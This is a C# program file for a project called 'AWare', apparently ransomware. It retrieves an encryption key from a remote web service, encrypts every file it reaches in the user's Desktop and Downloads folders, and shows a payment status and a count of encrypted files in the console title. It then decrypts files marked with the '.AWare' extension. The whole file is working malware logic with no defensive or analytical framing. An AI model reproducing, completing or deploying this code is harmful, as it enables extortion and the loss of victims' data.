using AWare.Helper;
using AWare.Services;
using System;
using System.Collections.Generic;
using System.Threading;
using System.Threading.Tasks;
using System.IO;
using AWare.Services.Web;
using System.Linq;
using AWare.Extensions;

namespace AWare
{
    internal static class Program
    {
        
        private static AesServices _aesServices;

        public static List<string> ProtectedFiles = new List<string>();
        private static string SecretKey { get; set; } // Do not put anything here, the secret key is always different      
        private static string ConsoleTitle => $"AWare — {ConsoleHelper.PaymentStatus.Log} | Files Encrypted's: {(double)ProtectedFiles.Count}";

        //private static IEnumerable<string> Files { get; set; }

        private static readonly string[] ImportantPaths = new string[]
        {
            Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory),
            ConsoleHelper.GetDownloadsPath()
        };

        private static async Task Main()
        {

            _aesServices = new AesServices();

            var aWareResponse = await new AWareWebServices(new UidHelper().Id).InitializeAWareWebServicesAsync();

            if (!aWareResponse.success)
            {
                Environment.Exit(0);
            }

            SecretKey = _aesServices.DecryptString(aWareResponse.SecretKey, aWareResponse.EncryptionKey);

            foreach (var i in ImportantPaths)
            {
                i.EncryptDirectories(_aesServices, SecretKey);
            }


            if (Console.WindowWidth != 220)
            {
                Console.WindowWidth = 220;
            }            

            var consoleUpdateThread = new Thread(async () =>
            {
                while (true)
                {

                    Console.Title = ConsoleTitle;

                    await Task.Delay(25);
                }
            });

            consoleUpdateThread.Start();

            ConsoleHelper.AsciiHeader(aWareResponse.SessionID);

            foreach (var i in ProtectedFiles)
            {
                while (true)
                {
                    try
                    {
                        var fileInfo = new FileInfo(i);

                        if (!fileInfo.Name.ToLower().Contains("aware"))
                            break;

                        _aesServices.DecryptFile(i, $"{fileInfo.FullName.Replace(".AWare", "")}", SecretKey, 10);

                        break;
                    }
                    catch
                    {
                        continue;
                    }
                }
            }

            Environment.Exit(0);

        }
    }
}
